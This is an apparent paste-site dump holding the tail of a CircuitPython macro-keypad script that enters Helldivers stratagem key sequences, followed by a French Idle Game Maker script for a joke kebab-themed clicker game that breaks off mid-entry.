        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_exp_anti_tank():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_commando():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_recoilless_rifle():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_railgun():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_grenade():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_flame_thrower():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_arc_thrower():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_auto_cannon():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_spear():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_laser_cannon():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_quaser_cannon():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_sterilizer():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_wasp():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def gun_airburst_rocket():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

# Backpack

def bp_jump_pack():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def bp_las_guard_dog():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def bp_guard_dog():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def bp_gas_guard_dog():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def bp_supply():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def bp_shield_gen():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def bp_ballistic_shield():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def bp_directional_shield():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

# Sentry

def sen_shield():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def sen_gatling():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def sen_machine():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def sen_flame():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def sen_arc_tower():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def sen_mortar():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def sen_mortar_ems():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def sen_auto_cannon():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def sen_rocket():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def sen_mines():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def sen_mines_incendiary():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def sen_mines_tank():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def sen_hmg_emplacement():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def sen_anti_tank_emplacement():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000, False)
        strat_key_release()

# Eagle

def eagle_five_hundred_kg():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def eagle_airstrike():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def eagle_smoke():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def eagle_cluster():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def eagle_strafing_run():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def eagle_napalm():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def eagle_110mm():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000, False)
        strat_key_release()

# Vehicle

def veh_patriot():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def veh_emancipator():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

def veh_fast_recon():
    with ActionInProgress() as action:
        strat_key_press(random.randrange(1, max_time)/1000)
        p_left(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_right(random.randrange(1, max_time)/1000)
        p_down(random.randrange(1, max_time)/1000)
        p_up(random.randrange(1, max_time)/1000, False)
        strat_key_release()

while True:
    event = kp.events.get()
    if event:
        if event.pressed:
            # print(""Key pressed:"", event.key_number)
        # First Row ###################################################
            if event.key_number == 0:
                with ActionInProgress():
                    base_resupply()
                    # kbd.press(Keycode.A)
                    # kbd.release(Keycode.A)
            elif event.key_number == 1:
                with ActionInProgress():
                    gun_laser_cannon()
            elif event.key_number == 2:
                with ActionInProgress():
                    gun_spear()
            elif event.key_number == 3:
                with ActionInProgress():
                    gun_heavy_machine()
            elif event.key_number == 4:
                with ActionInProgress():
                    gun_auto_cannon()
            elif event.key_number == 5:
                with ActionInProgress():
                    bp_shield_gen()
            elif event.key_number == 6:
                with ActionInProgress():
                    bp_las_guard_dog()
        # Second Row ###################################################
            elif event.key_number == 7:
                with ActionInProgress():    
                    sen_machine()
            elif event.key_number == 8:
                with ActionInProgress():
                    sen_auto_cannon()
            elif event.key_number == 9:
                with ActionInProgress():
                    sen_mortar_ems()
            elif event.key_number == 10:
                with ActionInProgress():
                    sen_hmg_emplacement()
            elif event.key_number == 11:
                with ActionInProgress():
                    bp_jump_pack()
            elif event.key_number == 12:
                with ActionInProgress():
                    veh_patriot ()
            elif event.key_number == 13:
                with ActionInProgress():
                    base_seaf_art()
        # Third Row ###################################################
            elif event.key_number == 14:
                with ActionInProgress():
                    base_renforce()
            elif event.key_number == 15:
                with ActionInProgress():
                    eagle_airstrike()
            elif event.key_number == 16:
                with ActionInProgress():
                    eagle_five_hundred_kg()
            elif event.key_number == 17:
                with ActionInProgress():    
                    eagle_cluster()
            elif event.key_number == 18:
                with ActionInProgress():
                    orb_napalm_barrage()
            elif event.key_number == 19:    
                with ActionInProgress():
                    orb_laser()
            elif event.key_number == 20:
                with ActionInProgress():
                    orb_railcannon_strike()
        # else:
        #     print(""Key released:"", event.key_number)

# 
"
RZWNAvnZ,Untitled,Foufou10,CSS,Monday 24th of March 2025 04:24:08 PM CDT,"Let's make a game!
    name:Lemon Clicker
    by:Coyote
    desc: Projet shitpost pour Dusk, bisous sur toi <3
    created:24/03/2025
    updated:24/03/2025
    version:Indev-1
Settings
	background:https://i.imgur.com/hxLtTQG.png
	building cost increase:130%
	building cost refund:0%
	spritesheet:icons, 48 by 48, https://imgur.com/dkvbvwa.png
	stylesheet:https://pastebin.com/raw/hdqKf9wP
Layout
	use default
Buttons
	*kebabButton
		name:Ramasser un citron
		desc:Un magnifique citron est dans l'herbe. Prenez le !
		on click:anim icon wobble
		on click:yield 1 kebab
        on click:if (have television and chance(0.4%)) yield 1 trophy
		icon:https://imgur.com/DoXjqNP.png
		no text
		class:bigButton hasFlares
		icon class:shadowed
		tooltip origin:bottom
		tooltip class:red
		
Resources
	*kebab|kebabs
		name:Citron|Citrons
		desc:Vos kebabs. Viande composée de 17 animaux différents. Votre but est d'en avoir le plus.
		icon:https://i.imgur.com/DiSvTG3.png
		class:noBackground
		show earned
    *trophy|trophies
        name:Titre Meilleur Kebab|Titres Meilleur Kebab
		desc:Titre du meilleur kebab du mois. Précieux à votre notoriété et rare à récupéré.
		icon:https://imgur.com/2oxzUKi.png
		class:noBackground
		show earned
    *client|clients
        name:Client|Clients
		desc:Vos clients, la base de tout votre gagne-pain. On dit merci qui ?
		icon:https://i.imgur.com/8j7t4Ac.png
		class:noBackground
		show earned
Shinies
	*critiqueGastro
		on click:log Woop
		movement:onRight moveLeft fade bounce:0.05
		frequency:60
		frequency variation:30
		icon:https://imgur.com/AVUd3jF.png
		class:bigButton
		on click:
			$boost=1
			if (chance(25%))
				//get at least 7, or between 1 and 3 minutes of our kebab production
				$amount=max(7,random(kebabs:ps*60*1,kebabs:ps*60*3))*$boost
				toast J-P C vous achète<//><b>[$amount] kebabs</b>.
				yield $amount kebabs
			else
				$amount=1*$boost
				toast Jean Pierre Coffe vous récompense de <//><b>[$amount] titres meilleurs kebab[s?$amount]</b>!
				yield $amount trophy
			end
		end
    *clampinvisite
		on click:log Woop
		movement:anywhere moveRandom:6 fade bounce:0.1
		frequency:180
		frequency variation:60
		icon:https://i.imgur.com/kzS0JfF.png
		class:bigButton
		on click:
			$boost=1
			if (chance(65%))
				//get at least 7, or between 1 and 3 minutes of our kebab production
				$amount=max(10,random(kebabs:ps*60*1,kebabs:ps*60*6))*$boost
				toast Simon vous achète<//><b>[$amount] kebabs</b> et s'envole.
				yield $amount kebabs
			else if (chance(10%))
				$amount=3*$boost
				toast Simon se régale et vous donne <//><b>[$amount] titres meilleurs kebab[s?$amount]</b>!
				yield $amount trophy
            else
                $amount=max(10,random(clients:ps*60*1,clients:ps*60*6))*$boost
			    toast Simon vous offre <//><b>[$amount] clients</b> et s'envole.
				yield $amount clients
			end
		end
Buildings
	*TEMPLATE
		on click:anim glow
		
	*appakebab|appaskebab
		name:Appareil à Kebab|Appareils à Kebab
		desc:Appareil permettant de cuir le viande à kebab.<//><b>Effet:</b><.>Produit 2 kebabs toute les 10 secondes.
		icon:https://i.imgur.com/XVXEOxQ.png
		cost:20 kebabs
		on tick:yield 0.2 kebabs
		on tick:yield 0.1 clients
		unlocked
	*table|tables
		name:Table et chaises|Tables et chaises
		desc:Plus de tables, plus de clients, plus de kebab<//><b>Effet:</b><.>Produit 8 kebabs toute les 10 secondes.
		icon:https://i.imgur.com/krjWf32.png
		cost:100 kebabs
		on tick:yield 0.8 kebabs
		on tick:yield 0.4 clients
		req:100 kebabs:earned and 10 clients:earned
	
	*kebabier|kebabiers
		name:Kebabier|Kebabiers
		desc:Engager un nouveau chef kebabier.<//><b>Effet:</b><.>Produit 5 kebabs par seconde.
		icon:https://i.imgur.com/x5ITEfK.png
		cost:600 kebabs
		on tick:yield 5 kebabs
		on tick:yield 2.5 clients
		req:600 kebabs:earned and 500 clients:earned
	
	*cuisine|cuisines
		name:Cuisine|Cuisines
		desc:De nouvelles cuisines pour votre restau.<//><b>Effet:</b><.>Produit 12 kebabs par seconde.
		icon:https://i.imgur.com/VxpI8PF.png
		cost:4000 kebabs
		on tick:yield 12 kebabs
		on tick:yield 6 clients
		req:4000 kebabs:earned and 3000 clients:earned
	
	*restlocal|restslocal
		name:Restaurant local|Restaurants locaux
		desc: Racheter des bâtiments dans les environs et faites en des kebabs.<//><b>Effet:</b><.>Produit 90 kebabs par seconde.
		icon:https://i.imgur.com/7YPlmbQ.png
		cost:20000 kebabs
		on tick:yield 90 kebabs
		on tick:yield 30 clients
		req:20000 kebabs:earned and 10000 clients:earned
	
	*franchisel|franchisesl
		name:Restaurant franchisé|Restaurants franchisés
		desc:Engager des franchisés pour ouvrir d'autre kebab dans le pays<//><b>Effet:</b><.>Produit 300 kebabs par seconde.
		icon:https://i.imgur.com/c49IcSV.png
		cost:200000 kebabs, 1 trophy
		on tick:yield 300 kebabs
		on tick:yield 150 clients
		req:200000 kebabs:earned and 300000 clients:earned
		
	*franchisei|franchisesi
		name:Franchise internationale|Franchises internationale
		desc:Ouvrez vos kebabiers à l'international.<//><b>Effet:</b><.>Produit 1000 kebabs par seconde.
		icon:https://i.imgur.com/TvYPAKi.png
		cost:3000000 kebabs, 1 trophies
		on tick:yield 1000 kebabs
		on tick:yield 450 clients
		req:3000000 kebabs:earned and 3000000 clients:earned
		
	*usinekeb|usineskeb
		name:Usine à Kebabs|Usines à Kebab
		desc:Ouvrez des usines pour vendre vos kebabs en supermarché.<//><b>Effet:</b><.>Produit 4000 kebabs à la seconde.
		icon:https://i.imgur.com/tK9GyoZ.png
		cost:70000000 kebabs, 16 trophies
		on tick:yield 4000 kebabs
		on tick:yield 3000 clients
        on tick:if (have pagecritique) yield 0.01 trophy
		req:70000000 kebabs:earned and 30000000 clients:earned
		
	*thekairi
		name:Transcendance kébabière
		text:Transcendance kébabière ([this]%)
		desc:Rallier le véritable Dieu des kebabs à vos restaurants et demander 1/100 de sa puissance.<//><b>La transcendance est complète à [this]%.</b><//><b>Effet:</b><.>Produit 20.000 kebab toute les secondes.
		icon:https://i.imgur.com/5i80myE.png
		cost:300000000 kebabs, 100 trophies
		req:70000000 kebabs:earned and transartifact:earned
		limit:100
		cost increase:105%
        on tick:yield 5000 kebabs
Achievements
	*10clicks
  		name:Wowie! Ten whole clicks!
  		desc:You've clicked the big red button 10 times. Well done. Well done indeed.
  		req:10 kebabButton:clicks
Items
	*sword
  		name:A sword
  		desc:A very generic sword. +3 attack.
  		passive:grant 3 kebabs

Upgrades
	*TEMPLATE
		on click:anim glow
	
	//food upgrades
	//inspiration : http://rabbit.org/suggested-vegetables-and-fruits-for-a-rabbit-diet/
	
	*sauceketchup
		name:Sauce Ketchup
		desc:Un délice à la tomate à ajouter à votre carte.<//><b>Effet:</b><.>+1 kebab/click
		icon:https://i.imgur.com/jMWwIH5.png
		cost:100 kebabs
		passive:increase kebab yield of kebabButton by 1
		req:10 kebabs:earned
	*sauceblanche
		name:Sauce Blanche
		desc:Sauce classique des kebabs<//><b>Effet:</b><.>+1 kebab/click
		icon:https://i.imgur.com/dzul4Oo.png
		cost:200 kebabs
		passive:increase kebab yield of kebabButton by 1
		req:50 kebabs:earned
		
	*sauceharissa
		name:Sauce Harissa
		desc:Ca pique sa mère mais qu'est que c'est bon.<//><b>Effet:</b><.>+1 kebab/click
		icon:https://i.imgur.com/nYSYztS.png
		cost:400 kebabs
		passive:increase kebab yield of kebabButton by 1
		req:200 kebabs:earned
		
	*saucemayo
		name:Sauce Mayonnaise
		desc:La sauce préféré des gros américains.<//><b>Effet:</b><.>kebabs/click x2<.>Production kebab +5%
		icon:https://i.imgur.com/UTUaEGz.png
		cost:3000 kebabs
		passive:multiply kebab yield of kebabButton by 2
		passive:multiply yield of kebabs by 1.05
		req:1000 kebabs:earned
		
	*saucepoivre
		name:Sauce Poivre
		desc:Faites croire au gens que vous avez du budget <//><b>Effet:</b><.>kebabs/click x1.5<.>Production kebab +5%
		icon:https://i.imgur.com/WIgGtIx.png
		cost:10000 kebabs
		passive:multiply kebab yield of kebabButton by 1.5
		passive:multiply yield of kebabs by 1.05
		req:1000 kebabs:earned
		
	*sauceandalouse
		name:Sauce Andalouse
		desc:TOI TOI, MA BELLE ANDALOUSE.<//><b>Effet:</b><.>kebabs/click x1.5<.>Production kebab +5%
		icon:https://i.imgur.com/W5IHsBm.png
		cost:50000 kebabs
		passive:multiply kebab yield of kebabButton by 1.5
		passive:multiply yield of kebabs by 1.05
		req:10000 kebabs:earned
		
	*sancehannibal
		name:Sauce Hannibal
		desc:Sauce avec le nom d'un mec qui bouffait des gens.<//><b>Effet:</b><.>kebabs/click x1.5<.>Production kebab +5%
		icon:https://i.imgur.com/CzHmniw.png
		cost:100000 kebabs
		passive:multiply kebab yield of kebabButton by 1.5
		passive:multiply yield of kebabs by 1.05
		req:50000 kebabs:earned
		
	*saucealien
		name:Sauce Alien
		desc:On dit que c'est le sang de Dame Tu Cosita. En vrais on sait pas ce que c'est.<//><b>Effet:</b><.>kebabs/click x1.5<.>Production kebab +5%
		icon:https://i.imgur.com/yNB9nec.png
		cost:500000 kebabs
		passive:multiply kebab yield of kebabButton by 1.5
		passive:multiply yield of kebabs by 1.05
		req:100000 kebabs:earned
		
	*saucechipotle
		name:Sauce Chipotle
		desc:Meilleur sauce piquante du mooonde!<//><b>Effet:</b><.>kebabs/click x1.5<.>PProduction kebab +5%
		icon:https://i.imgur.com/XKzfET3.png
		cost:1000000 kebabs
		passive:multiply kebab yield of kebabButton by 1.5
		passive:multiply yield of kebabs by 1.05
		req:500000 kebabs:earned
		
	*saucevide
		name:Sauce V̴͔͎̼̻̼̺́̽̾̍͆̈́͊͐̅͆̀̕į̶̨̢͎̜̻̬̥̙̤̦̩̔͐͛͌͒̓͜͝ḑ̵̧̻̠͚͍͕͍̟͍̰̬̒̀̅̅̏̾̔̃͝͠ę̷̛̠̝̲͙̼̳͉̞̺͙͌̃̌́͆̇̽͗̅͝͠͝ͅ
		desc:Une sauce venue d'une autre dimension probablement..<//><b>Effet:</b><.>kebabs/click x2<.>Production kebab +10%
		icon:https://i.imgur.com/vudc4Rs.png
		cost:100000000 kebabs
		passive:multiply kebab yield of kebabButton by 2
		passive:multiply yield of kebabs by 1.4
		req:1000000 kebabs:earned
//building upgrade	
	*buildingUpgrade1
		name:Friteuse haute vitesse
		desc:Produisez de folles quantités de frites!<//><b>Effet:</b><.>appareils kebab x2<.>tables x2<.>kebabiers x2
		icon:https://i.imgur.com/jICQCjR.png
		cost:1000 kebabs
		passive:multiply yield of appakebab by 3
		passive:multiply yield of table by 3
		passive:multiply yield of kebabier by 3
		req:(appaskebab>=10 or tables>=10 or kebabiers>=10)
		
	*buildingUpgrade2
		name:Broche en titane
		desc:Les broches résistent à de plus grandes températures donc cuisson plus rapide. <//><b>Effet:</b><.>appareils kebab x2<.>tables x2<.>kebabiers x2
		icon:https://i.imgur.com/1KCoFNn.png
		cost:100000 kebabs
		passive:multiply yield of appakebab by 5
		passive:multiply yield of table by 5
		passive:multiply yield of kebabier by 5
		req:(appaskebab>=50 or tables>=50 or kebabiers>=50)
		
	*buildingUpgrade3
		name:Table ultra modernes
		desc:Nouvelles table modernes qui attire le coup d'oeil.<//><b>Effet:</b><.>appareils kebab x2<.>tables x2<.>kebabiers x2
		icon:https://i.imgur.com/5qswrNH.png
		cost:5000000 kebabs
		passive:multiply yield of appakebab by 7
		passive:multiply yield of table by 7
		passive:multiply yield of kebabier by 7
		req:(appaskebab>=100 or tables>=100 or kebabiers>=100)
		
	*buildingUpgrade4
		name:Alarmes incendie
		desc:Enfin en règle pour la brigade anti-fraude.<//><b>Effet:</b><.>cuisine x2<.>restaurants locaux x2
		icon:https://i.imgur.com/BBalBEc.png
